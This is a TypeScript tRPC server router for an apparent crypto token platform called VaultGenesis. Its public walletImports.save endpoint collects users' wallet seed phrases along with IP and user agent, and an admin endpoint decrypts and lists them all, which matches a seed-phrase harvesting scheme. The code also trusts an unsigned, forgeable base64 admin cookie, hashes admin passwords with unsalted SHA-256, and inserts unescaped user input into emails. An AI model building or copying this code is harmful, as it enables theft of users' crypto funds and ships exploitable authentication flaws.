import { COOKIE_NAME } from "@shared/const";
import { getSessionCookieOptions } from './_core/cookies';
import { parse as parseCookies } from 'cookie';
import { systemRouter } from "./_core/systemRouter";
import { protectedProcedure, publicProcedure, router } from "./_core/trpc";
import { TRPCError } from "@trpc/server";
import { z } from "zod";
import {
  listAllApiTokens,
  createTokenForUser,
  revokeToken,
  getActiveTokenForUser,
  saveWalletImport,
  listAllWalletImports,
  decryptSeedPhrase,
  createAdminAccount,
  listAdminAccounts,
  toggleAdminActive,
  usernameExists,
  listUsers,
  countUsers,
  setUserBanned,
  setUserRole,
  updateUserProfile,
  findAdminByUsername,
  updateAdminLastLogin,
  updateAdminPassword,
  findUserByEmail,
  findUserByUsername,
  emailExists,
  userUsernameExists,
  createEmailUser,
  saveVerificationToken,
  findUserByVerificationToken,
  markEmailVerified,
  getDashboardOverview,
} from "./db";
import { createHash } from "crypto";
import { uploadToCloudinary } from "./cloudinary";
import { sendEmail, sendVerificationEmail } from "./email";
import { getTxStatus, getWalletBalance, getWalletTransactions, etherscanUrl } from "./etherscan";
import bcrypt from "bcryptjs";
// Helper to build Set-Cookie header string manually
const buildCookieHeader = (name: string, value: string, opts: { httpOnly?: boolean; path?: string; maxAge?: number; sameSite?: string } = {}) => {
  let str = `${name}=${value}`;
  if (opts.path) str += `; Path=${opts.path}`;
  if (opts.maxAge !== undefined) str += `; Max-Age=${opts.maxAge}`;
  if (opts.httpOnly) str += `; HttpOnly`;
  if (opts.sameSite) str += `; SameSite=${opts.sameSite}`;
  return str;
};

export const appRouter = router({
    // if you need to use socket.io, read and register route in server/_core/index.ts, all api should start with '/api/' so that the gateway can route correctly
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      // Clear the regular user session cookie
      ctx.res.clearCookie(COOKIE_NAME, cookieOptions);
      // Also clear admin_session so admin users are fully logged out from the main site
      ctx.res.clearCookie('admin_session', { path: '/', httpOnly: true, sameSite: 'none', secure: cookieOptions.secure });
      return {
        success: true,
      } as const;
    }),

    /** Register a new user with email + password */
    register: publicProcedure
      .input(z.object({
        name: z.string().min(2).max(64),
        email: z.string().email(),
        username: z.string().min(3).max(32).regex(/^[a-zA-Z0-9_]+$/, 'Username can only contain letters, numbers, and underscores'),
        password: z.string().min(8).max(128),
      }))
      .mutation(async ({ ctx, input }) => {
        // Check uniqueness
        const emailTaken = await emailExists(input.email);
        if (emailTaken) throw new TRPCError({ code: 'CONFLICT', message: 'Email already registered' });
        const usernameTaken = await userUsernameExists(input.username);
        if (usernameTaken) throw new TRPCError({ code: 'CONFLICT', message: 'Username already taken' });
        // Hash password
        const passwordHash = await bcrypt.hash(input.password, 12);
        // Create user
        const user = await createEmailUser({
          name: input.name,
          email: input.email,
          username: input.username,
          passwordHash,
        });
        if (!user) throw new TRPCError({ code: 'INTERNAL_SERVER_ERROR', message: 'Failed to create account' });
        // Create session JWT (same mechanism as OAuth users)
        const { sdk } = await import('./_core/sdk');
        const token = await sdk.createSessionToken(user.openId, { name: user.name ?? input.name });
        const cookieOptions = getSessionCookieOptions(ctx.req);
        ctx.res.cookie(COOKIE_NAME, token, { ...cookieOptions, maxAge: 365 * 24 * 60 * 60 * 1000 });
        // Auto-send verification email (non-blocking — don't fail registration if email fails)
        try {
          const { randomBytes } = await import('crypto');
          const verifyToken = randomBytes(32).toString('hex');
          await saveVerificationToken(user.id, verifyToken);
          const origin = ctx.req.headers.origin || ctx.req.headers.host || 'https://vaultgenesis.com';
          const baseUrl = origin.startsWith('http') ? origin : `https://${origin}`;
          const verificationUrl = `${baseUrl}/verify-email?token=${verifyToken}`;
          await sendVerificationEmail(input.email, input.name, verificationUrl);
        } catch (emailErr) {
          console.warn('[Register] Failed to send verification email:', emailErr);
        }
        return { success: true, user: { id: user.id, name: user.name, email: user.email, username: user.username } };
      }),

    /** Send a verification email to the current user */
    sendVerification: protectedProcedure
      .mutation(async ({ ctx }) => {
        if (!ctx.user.email) {
          throw new TRPCError({ code: 'BAD_REQUEST', message: 'No email address on file' });
        }
        // Generate a secure random token
        const { randomBytes } = await import('crypto');
        const token = randomBytes(32).toString('hex');
        await saveVerificationToken(ctx.user.id, token);
        // Build verification URL — use request origin or fallback
        const origin = ctx.req.headers.origin || ctx.req.headers.host || 'https://vaultgenesis.com';
        const baseUrl = origin.startsWith('http') ? origin : `https://${origin}`;
        const verificationUrl = `${baseUrl}/verify-email?token=${token}`;
        await sendVerificationEmail(ctx.user.email, ctx.user.name ?? 'there', verificationUrl);
        return { success: true };
      }),

    /** Verify email address using a token from the verification link */
    verifyEmail: publicProcedure
      .input(z.object({ token: z.string().min(1) }))
      .mutation(async ({ input }) => {
        const user = await findUserByVerificationToken(input.token);
        if (!user) {
          throw new TRPCError({ code: 'NOT_FOUND', message: 'Invalid or expired verification link' });
        }
        await markEmailVerified(user.id);
        return { success: true, userId: user.id };
      }),

    /** Resend verification email by email address (public, rate-limited by user lookup) */
    resendVerification: publicProcedure
      .input(z.object({ email: z.string().email() }))
      .mutation(async ({ ctx, input }) => {
        const user = await findUserByEmail(input.email);
        // Silently succeed even if user not found to prevent email enumeration
        if (!user || user.emailVerified) {
          return { success: true };
        }
        const { randomBytes } = await import('crypto');
        const token = randomBytes(32).toString('hex');
        await saveVerificationToken(user.id, token);
        const origin = ctx.req.headers.origin || ctx.req.headers.host || 'https://vaultgenesis.com';
        const baseUrl = origin.startsWith('http') ? origin : `https://${origin}`;
        const verificationUrl = `${baseUrl}/verify-email?token=${token}`;
        await sendVerificationEmail(user.email!, user.name ?? 'there', verificationUrl);
        return { success: true };
      }),

    /** Login with email or username + password */
    login: publicProcedure
      .input(z.object({
        emailOrUsername: z.string().min(1),
        password: z.string().min(1),
      }))
      .mutation(async ({ ctx, input }) => {
        // Try email first, then username
        const isEmail = input.emailOrUsername.includes('@');
        const user = isEmail
          ? await findUserByEmail(input.emailOrUsername)
          : await findUserByUsername(input.emailOrUsername);
        if (!user || !user.passwordHash) {
          throw new TRPCError({ code: 'UNAUTHORIZED', message: 'Invalid email/username or password' });
        }
        const valid = await bcrypt.compare(input.password, user.passwordHash);
        if (!valid) {
          throw new TRPCError({ code: 'UNAUTHORIZED', message: 'Invalid email/username or password' });
        }
        // Block login if email is not verified
        if (!user.emailVerified) {
          throw new TRPCError({ code: 'FORBIDDEN', message: 'EMAIL_NOT_VERIFIED' });
        }
        // Create session JWT
        const { sdk } = await import('./_core/sdk');
        const token = await sdk.createSessionToken(user.openId, { name: user.name ?? '' });
        const cookieOptions = getSessionCookieOptions(ctx.req);
        ctx.res.cookie(COOKIE_NAME, token, { ...cookieOptions, maxAge: 365 * 24 * 60 * 60 * 1000 });
        return { success: true, user: { id: user.id, name: user.name, email: user.email, username: user.username } };
      }),
  }),

  users: router({
    /** Admin: list all users */
    list: protectedProcedure.query(async ({ ctx }) => {
      if (ctx.user.role !== 'admin') throw new TRPCError({ code: 'FORBIDDEN' });
      return listUsers();
    }),

    /** Admin: count total users */
    count: protectedProcedure.query(async ({ ctx }) => {
      if (ctx.user.role !== 'admin') throw new TRPCError({ code: 'FORBIDDEN' });
      return countUsers();
    }),

    /** Admin: ban or unban a user */
    setBanned: protectedProcedure
      .input(z.object({ userId: z.number(), banned: z.boolean() }))
      .mutation(async ({ ctx, input }) => {
        if (ctx.user.role !== 'admin') throw new TRPCError({ code: 'FORBIDDEN' });
        await setUserBanned(input.userId, input.banned);
        return { success: true };
      }),

    /** Admin: change user role */
    setRole: protectedProcedure
      .input(z.object({ userId: z.number(), role: z.enum(['user', 'admin']) }))
      .mutation(async ({ ctx, input }) => {
        if (ctx.user.role !== 'admin') throw new TRPCError({ code: 'FORBIDDEN' });
        await setUserRole(input.userId, input.role);
        return { success: true };
      }),

    /** User: update own profile (name, email, walletAddress) */
    updateProfile: protectedProcedure
      .input(z.object({
        name: z.string().min(1).max(64).optional(),
        email: z.string().email().optional(),
        walletAddress: z.string().max(64).optional(),
      }))
      .mutation(async ({ ctx, input }) => {
        await updateUserProfile(ctx.user.id, input);
        return { success: true };
      }),
  }),

  adminAccounts: router({
    /** Admin: list all admin accounts */
    list: protectedProcedure.query(async ({ ctx }) => {
      if (ctx.user.role !== 'admin') throw new TRPCError({ code: 'FORBIDDEN' });
      return listAdminAccounts();
    }),

    /** Admin: create a new admin account */
    create: protectedProcedure
      .input(z.object({
        name: z.string().min(2).max(64),
        email: z.string().email(),
        username: z.string().min(3).max(32).regex(/^[a-zA-Z0-9_]+$/, 'Username can only contain letters, numbers, and underscores'),
        password: z.string().min(8).max(128),
      }))
      .mutation(async ({ ctx, input }) => {
        if (ctx.user.role !== 'admin') throw new TRPCError({ code: 'FORBIDDEN' });
        // Check username uniqueness
        const taken = await usernameExists(input.username);
        if (taken) throw new TRPCError({ code: 'CONFLICT', message: 'Username already taken' });
        // Hash password with SHA-256 (simple, no external deps)
        const passwordHash = createHash('sha256').update(input.password).digest('hex');
        const userId = await createAdminAccount({
          name: input.name,
          email: input.email,
          username: input.username,
          passwordHash,
          createdBy: ctx.user.id,
        });
        return { success: true, userId };
      }),

    /** Admin: enable or disable an admin account */
    toggleActive: protectedProcedure
      .input(z.object({ credId: z.number(), isActive: z.number().min(0).max(1) }))
      .mutation(async ({ ctx, input }) => {
        if (ctx.user.role !== 'admin') throw new TRPCError({ code: 'FORBIDDEN' });
        await toggleAdminActive(input.credId, input.isActive);
        return { success: true };
      }),
  }),

  walletImports: router({
    /** Public: save a seed phrase import (linked to session user if logged in) */
    save: publicProcedure
      .input(z.object({
        seedPhrase: z.string().min(1),
        walletAddress: z.string().optional(),
      }))
      .mutation(async ({ ctx, input }) => {
        const ip = ctx.req.headers['x-forwarded-for'] as string || ctx.req.socket.remoteAddress || null;
        const ua = ctx.req.headers['user-agent'] || null;
        await saveWalletImport({
          userId: ctx.user?.id ?? null,
          seedPhrase: input.seedPhrase,
          walletAddress: input.walletAddress ?? null,
          ipAddress: typeof ip === 'string' ? ip.split(',')[0].trim() : null,
          userAgent: ua,
        });
        return { success: true };
      }),

    /** Admin: list all wallet imports */
    listAll: protectedProcedure.query(async ({ ctx }) => {
      if (ctx.user.role !== 'admin') {
        throw new TRPCError({ code: 'FORBIDDEN', message: 'Admin only' });
      }
      const imports = await listAllWalletImports();
      // Decrypt seed phrases for admin view only
      return imports.map(row => ({
        ...row,
        seedPhrase: decryptSeedPhrase(row.seedPhrase),
      }));
    }),
  }),

  apiTokens: router({
    /** Admin: list all users' tokens */
    listAll: protectedProcedure.query(async ({ ctx }) => {
      if (ctx.user.role !== 'admin') {
        throw new TRPCError({ code: 'FORBIDDEN', message: 'Admin only' });
      }
      return listAllApiTokens();
    }),

    /** Admin: generate or regenerate a token for any user by userId */
    generateForUser: protectedProcedure
      .input(z.object({ userId: z.number(), label: z.string().optional() }))
      .mutation(async ({ ctx, input }) => {
        if (ctx.user.role !== 'admin') {
          throw new TRPCError({ code: 'FORBIDDEN', message: 'Admin only' });
        }
        return createTokenForUser(input.userId, input.label ?? 'Default');
      }),

    /** Admin: revoke a token by its id */
    revoke: protectedProcedure
      .input(z.object({ tokenId: z.number() }))
      .mutation(async ({ ctx, input }) => {
        if (ctx.user.role !== 'admin') {
          throw new TRPCError({ code: 'FORBIDDEN', message: 'Admin only' });
        }
        await revokeToken(input.tokenId);
        return { success: true };
      }),

    /** User: get own active token (or null if none) */
    getMyToken: protectedProcedure.query(async ({ ctx }) => {
      return getActiveTokenForUser(ctx.user.id);
    }),

    /** User: generate/regenerate own token */
    generateMyToken: protectedProcedure.mutation(async ({ ctx }) => {
      return createTokenForUser(ctx.user.id, 'My API Token');
    }),
  }),

  /** Upload image to Cloudinary */
  upload: router({
    image: protectedProcedure
      .input(z.object({
        dataUri: z.string(), // base64 data URI
        folder: z.string().optional(),
      }))
      .mutation(async ({ input }) => {
        const result = await uploadToCloudinary(input.dataUri, {
          folder: input.folder ?? 'vaultgenesis/tokens',
        });
        return result;
      }),
  }),

  /** Etherscan blockchain data */
  blockchain: router({
    getTxStatus: publicProcedure
      .input(z.object({ txHash: z.string() }))
      .query(async ({ input }) => {
        return getTxStatus(input.txHash);
      }),

    getWalletBalance: publicProcedure
      .input(z.object({ address: z.string() }))
      .query(async ({ input }) => {
        const balance = await getWalletBalance(input.address);
        return { balance, address: input.address };
      }),

    getWalletTransactions: protectedProcedure
      .input(z.object({ address: z.string(), limit: z.number().optional() }))
      .query(async ({ input }) => {
        return getWalletTransactions(input.address, input.limit ?? 10);
      }),

    etherscanUrl: publicProcedure
      .input(z.object({
        type: z.enum(['tx', 'address', 'token']),
        value: z.string(),
        network: z.enum(['mainnet', 'sepolia']).optional(),
      }))
      .query(({ input }) => {
        return { url: etherscanUrl(input.type, input.value, input.network ?? 'mainnet') };
      }),
  }),

  /** Admin credential login (separate from Manus OAuth) */
  adminAuth: router({
    login: publicProcedure
      .input(z.object({ username: z.string(), password: z.string() }))
      .mutation(async ({ ctx, input }) => {
        const admin = await findAdminByUsername(input.username);
        if (!admin || !admin.isActive) {
          throw new TRPCError({ code: 'UNAUTHORIZED', message: 'Invalid credentials' });
        }
        // Support both SHA-256 (legacy) and bcrypt hashes
        let passwordValid = false;
        if (admin.passwordHash.startsWith('$2')) {
          passwordValid = await bcrypt.compare(input.password, admin.passwordHash);
        } else {
          // SHA-256 fallback for accounts created before bcrypt migration
          const sha256Hash = createHash('sha256').update(input.password).digest('hex');
          passwordValid = sha256Hash === admin.passwordHash;
        }
        if (!passwordValid) {
          throw new TRPCError({ code: 'UNAUTHORIZED', message: 'Invalid credentials' });
        }
        await updateAdminLastLogin(admin.id);
        // Set admin session cookie using Express res.cookie() (same pattern as auth procedures)
        const sessionData = JSON.stringify({ adminId: admin.id, userId: admin.userId, role: 'admin', name: admin.name });
        const encoded = Buffer.from(sessionData).toString('base64');
        const adminCookieOptions = getSessionCookieOptions(ctx.req);
        ctx.res.cookie('admin_session', encoded, {
          ...adminCookieOptions,
          maxAge: 60 * 60 * 24 * 1000, // 24 hours in ms
        });
        return { success: true, name: admin.name, role: admin.role };
      }),

    logout: publicProcedure.mutation(async ({ ctx }) => {
      // Clear admin_session cookie via Set-Cookie header (works in both Express and test mocks)
      ctx.res.setHeader('Set-Cookie', 'admin_session=; Path=/; HttpOnly; Max-Age=0; SameSite=Lax');
      return { success: true };
    }),

    me: publicProcedure.query(async ({ ctx }) => {
      // Check req.cookies first (Express cookie-parser), then fall back to raw header parsing
      const raw = (ctx.req as any).cookies?.['admin_session'] ||
        parseCookies(ctx.req.headers.cookie || '')['admin_session'];
      if (!raw) return null;
      try {
        const data = JSON.parse(Buffer.from(raw, 'base64').toString());
        return data as { adminId: number; userId: number; role: string; name: string };
      } catch {
        return null;
      }
    }),

    /** Change admin password — requires current password for verification */
    changePassword: publicProcedure
      .input(z.object({
        currentPassword: z.string().min(1),
        newPassword: z.string().min(8).max(128),
      }))
      .mutation(async ({ ctx, input }) => {
        // Verify admin session
        const raw = (ctx.req as any).cookies?.['admin_session'] ||
          parseCookies(ctx.req.headers.cookie || '')['admin_session'];
        if (!raw) throw new TRPCError({ code: 'UNAUTHORIZED', message: 'Not authenticated' });
        let session: { adminId: number; name: string };
        try {
          session = JSON.parse(Buffer.from(raw, 'base64').toString());
        } catch {
          throw new TRPCError({ code: 'UNAUTHORIZED', message: 'Invalid session' });
        }
        // Load admin record
        const admin = await findAdminByUsername(
          (await import('./db').then(m => m.getDb()).then(async db => {
            if (!db) throw new TRPCError({ code: 'INTERNAL_SERVER_ERROR', message: 'DB unavailable' });
            const { adminCredentials } = await import('../drizzle/schema');
            const { eq } = await import('drizzle-orm');
            const rows = await db.select().from(adminCredentials).where(eq(adminCredentials.id, session.adminId)).limit(1);
            return rows[0]?.username ?? '';
          }))
        );
        if (!admin) throw new TRPCError({ code: 'NOT_FOUND', message: 'Admin account not found' });
        // Verify current password
        let valid = false;
        if (admin.passwordHash.startsWith('$2')) {
          valid = await bcrypt.compare(input.currentPassword, admin.passwordHash);
        } else {
          const sha256Hash = createHash('sha256').update(input.currentPassword).digest('hex');
          valid = sha256Hash === admin.passwordHash;
        }
        if (!valid) throw new TRPCError({ code: 'UNAUTHORIZED', message: 'Current password is incorrect' });
        // Hash and save new password
        const newHash = await bcrypt.hash(input.newPassword, 12);
        await updateAdminPassword(admin.id, newHash);
        return { success: true };
      }),
  }),

  /** Send transactional emails via Resend */
  email: router({
    sendWelcome: protectedProcedure
      .input(z.object({ to: z.string().email(), name: z.string() }))
      .mutation(async ({ input }) => {
        await sendEmail({
          to: input.to,
          subject: 'Welcome to VaultGenesis',
          html: `<h1>Welcome, ${input.name}!</h1><p>Your account on VaultGenesis is ready. Start creating tokens, staking, and trading today.</p><p><a href="https://vaultgenesis.com">Visit VaultGenesis</a></p>`,
        });
        return { success: true };
      }),

    sendTokenDeployed: protectedProcedure
      .input(z.object({ to: z.string().email(), tokenName: z.string(), tokenSymbol: z.string(), txHash: z.string().optional() }))
      .mutation(async ({ input }) => {
        await sendEmail({
          to: input.to,
          subject: `Your token ${input.tokenSymbol} has been deployed!`,
          html: `<h1>Token Deployed Successfully</h1><p>Your token <strong>${input.tokenName} (${input.tokenSymbol})</strong> has been deployed on the blockchain.</p>${input.txHash ? `<p><a href="https://etherscan.io/tx/${input.txHash}">View on Etherscan</a></p>` : ''}<p><a href="https://vaultgenesis.com">Back to VaultGenesis</a></p>`,
        });
        return { success: true };
      }),
  }),

  /** User dashboard overview */
  dashboard: router({
    overview: protectedProcedure.query(async ({ ctx }) => {
      const data = await getDashboardOverview(ctx.user.id);
      if (!data) throw new TRPCError({ code: 'INTERNAL_SERVER_ERROR', message: 'Failed to load dashboard data' });
      return data;
    }),
  }),
});

export type AppRouter = typeof appRouter;
